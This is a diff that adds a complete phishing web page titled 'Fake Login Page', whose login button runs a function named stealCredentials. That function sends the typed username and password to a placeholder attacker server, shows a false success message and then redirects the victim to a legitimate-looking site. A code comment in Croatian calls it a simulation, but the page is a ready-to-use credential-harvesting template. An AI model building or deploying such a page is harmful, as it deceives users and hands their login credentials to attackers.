@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Login Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .login-container { max-width: 300px; margin: 50px auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
+        input { margin: 10px 0; padding: 10px; width: 100%; }
+        button { padding: 10px; width: 100%; background-color: #007BFF; color: white; border: none; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button onclick="stealCredentials()">Login</button>
+</div>
+
+<script>
+    function stealCredentials() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Simuliraj slanje podataka na napadačev server
+        fetch('http://your-malicious-server.com/steal', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username, password })
+        })
+        .then(response => {
+            alert('Login successful!');
+            window.location.href = 'http://legitimate-website.com';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
+
+</body>
+</html>
